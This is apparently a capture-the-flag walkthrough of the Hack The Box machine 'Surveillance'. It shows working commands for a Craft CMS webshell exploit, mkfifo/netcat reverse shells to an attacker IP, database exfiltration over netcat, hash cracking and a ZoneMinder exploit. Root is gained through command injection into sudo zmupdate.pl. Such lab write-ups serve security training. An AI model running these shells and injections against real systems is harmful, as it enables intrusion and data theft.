# Reconnaissances 
## Port Scanning
`$ sudo nmap -p- -sC -sV -T4 10.10.11.245`
```
Nmap scan report for 10.10.11.245
Host is up (0.030s latency).
Not shown: 65426 closed tcp ports (reset), 107 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.81 seconds
```

### Observe the HTTP
`$ echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts`
`$ firefox surveillance.htb`
```
© 2024 All Rights Reserved By SURVEILLANCE.HTB
Powered by Craft CMS (redirected to https://github.com/craftcms/cms/tree/4.4.14)
```
`$ searchsploit craft cms`
```
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Craft CMS 2.6 - Cross-Site Scripting                                                                                                      | php/webapps/42143.txt
Craft CMS 2.7.9/3.2.5 - Information Disclosure                                                                                            | php/webapps/47343.txt
Craft CMS 3.0.25 - Cross-Site Scripting                                                                                                   | php/webapps/46054.txt
Craft CMS 3.1.12 Pro - Cross-Site Scripting                                                                                               | php/webapps/46496.txt
Craft CMS SEOmatic plugin 3.1.4 - Server-Side Template Injection                                                                          | linux/webapps/45108.txt
CraftCMS 3 vCard Plugin 1.0.0 - Remote Code Execution                                                                                     | php/webapps/48492.py
craftercms 4.x.x - CORS                                                                                                                   | multiple/webapps/51313.txt
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                            
┌──(kali㉿kali)-[~/PenTest/PlayGround/HTB/Surveillance]
└─$ 
```

And also refer to:
- https://github.com/Faelian/CraftCMS_CVE-2023-41892
- https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce

# Exploitation
`$ git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892.git`
`$ cd CraftCMS_CVE-2023-41892`
`$ python3 -m pip install requests`
`$ python3 craft-cms.py http://surveillance.htb`
```
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Interactive Shell
Listen on the localhost
`$ rlwrap nc -lnvp 9001`

Run on the target
```
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.49 9001 >/tmp/f  
```

Then
```
listening on [any] 9001 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.245] 53736
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@surveillance:~/html/craft/web$ 
```

# Post-Exploitation
Looking for something interesting
```
www-data@surveillance:~/html/craft/web$ ls
cpresources  css  fonts  images  img  index.php  js  web.config
www-data@surveillance:~/html/craft/web$ ls ../
bootstrap.php  composer.lock  craft       storage    vendor
composer.json  config         migrations  templates  web
www-data@surveillance:~/html/craft/web$ ls ../storage/
backups  config-deltas  logs  runtime
www-data@surveillance:~/html/craft/web$ ls ../storage/backups/
surveillance--2023-10-17-202801--v4.4.14.sql.zip
www-data@surveillance:~/html/craft/web$ 
```

## Download the SQL Backup
Listen on Localmachine
`$ nc -l -p 9002  > surveillance--2023-10-17-202801--v4.4.14.sql.zip`

Run on the Targetmachine
`nc 10.10.14.49 9002 < surveillance--2023-10-17-202801--v4.4.14.sql.zip`

Then unzip the file
```
$ unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip 
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql  
  
$ cat surveillance--2023-10-17-202801--v4.4.14.sql |grep users
```
```
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
```

### Password Cracking
```
$ echo '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec' > MatthewHash.txt
$ john MatthewHash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
starcraft122490  (?)     
1g 0:00:00:00 DONE (2024-03-15 04:34) 1.315g/s 4699Kp/s 4699Kc/s 4699KC/s stefon23..srflo1
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

## SSH Connect
`$ ssh matthew@10.10.11.245`
```
The authenticity of host '10.10.11.245 (10.10.11.245)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.245' (ED25519) to the list of known hosts.
matthew@10.10.11.245's password: starcraft122490
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 15 08:35:28 AM UTC 2024
```
```
matthew@surveillance:~$ cat user.txt 
32f086d0cfa39c85be45975c5a78f3b4

matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ sudo -l
[sudo] password for matthew: starcraft122490
Sorry, user matthew may not run sudo on surveillance.
```

## Privileges Escalation
Download linpeas to the target
```
$ wget http://10.10.14.49/linpeas.sh
--2024-03-15 08:40:26--  http://10.10.14.49/linpeas.sh
Connecting to 10.10.14.49:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860549 (840K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                 100%[========================================================================================>] 840.38K   870KB/s    in 1.0s    

2024-03-15 08:40:28 (870 KB/s) - ‘linpeas.sh’ saved [860549/860549]

```

Then run it
`$ chmod +x linpeas.sh`
`$ ./linpeas.sh`

### Enumeration
Some necessary information
```
╔══════════╣ Searching passwords in config PHP files
/usr/share/zoneminder/www/api/app/Config/database.php:          'password' => ZM_DB_PASS,                                                                                   
/usr/share/zoneminder/www/api/app/Config/database.php:          'password' => 'ZoneMinderPassword2023',
/usr/share/zoneminder/www/includes/config.php:  'Password'  => '',
```

Necessary port listen on localhost
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                               
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                                                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

```

Try to access it with ssh tunnel
`$ ssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245`

Then
`$ firefox 127.0.0.1:2222`
```
# _account_circle_ ZoneMinder Login
```

Search for the ZoneMinder version
```
matthew@surveillance:~$ cd /usr/share/zoneminder/www/api/app/Config/
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat * |grep -i version
Configure::write('ZM_VERSION', '1.36.32');
Configure::write('ZM_API_VERSION', '1.36.32.1');
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
 * for instance. Each version can then have its own view cache namespace.
cat: Schema: Is a directory
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ 
```

Searching for ZoneMinder exploit
```
$ searchsploit zoneminder 
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ZoneMinder 1.24.3 - Remote File Inclusion                                                                                                 | php/webapps/17593.txt
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery                               | php/webapps/41239.txt
ZoneMinder 1.32.3 - Cross-Site Scripting                                                                                                  | php/webapps/47060.txt
Zoneminder < v1.37.24 - Log Injection & Stored XSS & CSRF Bypass                                                                          | php/webapps/51071.py
ZoneMinder Video Server - packageControl Command Execution (Metasploit)                                                                   | unix/remote/24310.rb
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

And also got this thing from google:
- https://github.com/rvizx/CVE-2023-26035

### Exploit the ZoneMinder
`$ git clone https://github.com/rvizx/CVE-2023-26035`  
`$ cd CVE-2023-26035`  

Listeing port
`$ rlwrap nc -lnvp 8888`

Run exploit
`$ python3 exploit.py -t http://127.0.0.1:2222/ -i 10.10.14.49 -p 8888`
```
[>] fetching csrf token
[>] recieved the token: key:9c588a857927b60ea9ffa3eb5055a067587c2e44,1710493239
[>] executing...
[>] sending payload..
```

Then
```
$ rlwrap nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.245] 50010
bash: cannot set terminal process group (1113): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```
```
zoneminder@surveillance:/usr/share/zoneminder/www$ ls /usr/bin/ |grep zm
bzmore
lzma
lzmainfo
lzmore
unlzma
xzmore
zm_rtsp_server
zmaudit.pl
zmc
zmcamtool.pl
zmcontrol.pl
zmdc.pl
zmfilter.pl
zmonvif-probe.pl
zmonvif-trigger.pl
zmore
zmpkg.pl
zmrecover.pl
zmstats.pl
zmsystemctl.pl
zmtelemetry.pl
zmtrack.pl
zmtrigger.pl
zmu
zmupdate.pl
zmvideo.pl
zmwatch.pl
zmx10.pl
```

Dig from an internet and it said that 
```
the user parameter in zmupdate.pl, you can input a file directory instead of a user
```

Then try to exploit it
`$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023`
```
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
<ser='$(/bin/bash -i)' --pass=ZoneMinderPassword2023

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
bash: cannot set terminal process group (1113): Inappropriate ioctl for device
bash: no job control in this shell
root@surveillance:/usr/share/zoneminder/www# id
id
root@surveillance:/usr/share/zoneminder/www# 
```
Can not interactive with the shell.

Try to get a reverse connection
`$ rlwrap nc -lnvp 4444`

Use mkfifo on the target machine
`root@surveillance:/usr/share/zoneminder/www# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.49 4444 >/tmp/f`

Then
```
listening on [any] 4444 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.245] 49652
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
397c4166a05d2a7508aa7b2b856d4c51
# 
```